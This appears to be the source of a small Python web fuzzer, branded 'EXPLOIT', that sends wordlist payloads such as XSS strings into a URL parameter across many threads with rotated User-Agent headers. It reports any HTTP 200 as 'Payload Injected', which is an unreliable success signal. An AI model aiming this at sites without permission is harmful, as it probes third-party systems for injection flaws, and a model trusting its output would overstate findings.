import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import random

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/14.1.2 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 Chrome/83.0.4103.106 Mobile Safari/537.36"
]

##waste things 
GREEN = '\033[92m'
RED = '\033[91m'
RESET = '\033[0m'
PURPLE = '\033[1;35m'  
BLUE = "\033[0;34m"
## 

def load_wordlist(wordlist):
    try:
        with open(wordlist,'r') as file:
            wordlist = file.read().splitlines()
            return wordlist
    except FileNotFoundError:
        print("Error wordlist not found :)")
        return
    
def check_url(url,word):
    headers = {
        "User-Agent": random.choice(USER_AGENTS)
    }
    full_url = f"{url}{word}"
    try:
        response = requests.get(full_url,headers=headers,timeout=5)
        if response.status_code == 200:
            print(f"{GREEN}Payload Injected : {full_url}\nTested Payload : {word}{RESET}")
        elif response.status_code == 403:
            print(f"{RED}Forbidden : {full_url}\nTested Payload : {word}{RESET}")
        elif response.status_code in (301,302): 
            print(f"{BLUE}Redirection : {full_url}\nTested Payload : {word}{RESET}")
        else:
            print(f"{BLUE}Nothing Here : {full_url}\nTested Payload : {word}{RESET}")
    except requests.exceptions.RequestException as e:
        print(f"Error found : {e}")

def inject(url, wordlist, max_threads):
    print(f"{len(wordlist)} payloads found!!")
    print(f"Testing payloads with {max_threads} threads...\n")

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = [executor.submit(check_url, url, word) for word in wordlist]
        for future in as_completed(futures):
            pass  # Results are printed inside `check_url`

def main():
    print('''
        ╔══════════════════════════════════════════════════════════════════════╗
        ║                                                                      ║
        ║  ███████╗██╗  ██╗██████╗ ██████╗ ██╗      ██████╗ ██╗████████╗       ║
        ║  ██╔════╝╚██╗██╔╝╚════██╗██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝       ║
        ║  █████╗   ╚███╔╝  █████╔╝██████╔╝██║     ██║   ██║██║   ██║          ║
        ║  ██╔══╝   ██╔██╗  ╚═══██╗██╔═══╝ ██║     ██║   ██║██║   ██║          ║
        ║  ███████╗██╔╝ ██╗██████╔╝██║     ███████╗╚██████╔╝██║   ██║          ║
        ║  ╚══════╝╚═╝  ╚═╝╚═════╝ ╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝          ║
        ║                                                                      ║
        ║      Developed By : Pr3fessorV3rus                                   ║
        ║      GitHub       : https://github.com/MASTERMONTYOFFICIAL           ║
        ╚══════════════════════════════════════════════════════════════════════╝
''')
    
    try:
        print("Tool Loaded Successfully.\n")
        time.sleep(1)
        url = input("Enter URL (e.g. https://example.com?id=): ").strip()
        if not url.startswith("http://") and not url.startswith("https://"):
            url = "https://" + url

        wordlist_file = input("Enter the path of the wordlist (e.g. xss.txt): ").strip()
        wordlist = load_wordlist(wordlist_file)


        if not wordlist:
            print("No valid wordlist loaded. Exiting...")
            return


        try:
            max_threads = int(input("Enter number of threads to use (e.g. 10): ").strip())
            if max_threads < 1:
                raise ValueError
        except ValueError:
            print("Invalid thread count. Using default: 5")
            max_threads = 5

        start = time.perf_counter()
        inject(url, wordlist,max_threads)
        end = time.perf_counter()
        print(f"Exploitation completed in {round(end-start,2)}seconds(s)")
    except KeyboardInterrupt:
        print("\nThanks for coming...")

if __name__ == "__main__":
    main()
   
